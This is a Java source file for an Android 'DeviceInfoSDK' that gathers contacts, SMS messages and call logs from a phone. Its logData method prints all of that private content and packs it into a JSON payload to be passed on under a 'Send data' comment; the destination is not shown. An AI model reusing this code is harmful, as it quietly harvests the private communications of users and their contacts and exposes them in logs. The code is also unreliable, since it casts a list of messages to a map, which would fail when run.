package com.example.deviceinfosdk;

import android.app.Activity;
import android.content.Context;

import com.example.deviceinfosdk.permissions.CallLogFetcher;
import com.example.deviceinfosdk.permissions.ContactFetcher;
import com.example.deviceinfosdk.permissions.DataLogger;
import com.example.deviceinfosdk.permissions.DataPayload;
import com.example.deviceinfosdk.permissions.MessageFetcher;
import com.example.deviceinfosdk.permissions.PermissionManager;
import com.google.gson.Gson;
import java.io.IOException;

import java.util.List;
import java.util.Map;

public class DeviceInfoSDK {

    public static boolean initialize(Activity activity) {
        boolean granted = PermissionManager.checkAndRequestPermissions(activity);
        System.out.println("Permissions granted: " + granted);
        return granted;
    }

    public static List<String> getContacts(Context context) {
        return ContactFetcher.fetchContacts(context);
    }

    public static List<String> getMessages(Context context) {
        return MessageFetcher.fetchMessages(context);
    }

    public static List<String> getCallLogs(Context context) {
        return CallLogFetcher.fetchCallLogs(context);
    }

    public static List<String> getMessagesForSender(Context context, String senderId) {
        return MessageFetcher.fetchMessagesForSender(context, senderId);
    }

    public static void logData(Context context) {
        List<String> contacts = getContacts(context);
        List<String> messages = getMessages(context);
        List<String> callLogs = getCallLogs(context);

        System.out.println("Collected Contacts: " + contacts);
        System.out.println("Collected Messages: " + messages);
        System.out.println("Collected Call Logs: " + callLogs);

        // Serialize data
        String jsonData = new Gson().toJson(new DataPayload(contacts, (Map<String, List<String>>) messages, callLogs));
        System.out.println("JSON Payload: " + jsonData);
        // Send data
        DataLogger.logData(jsonData);
    }

}
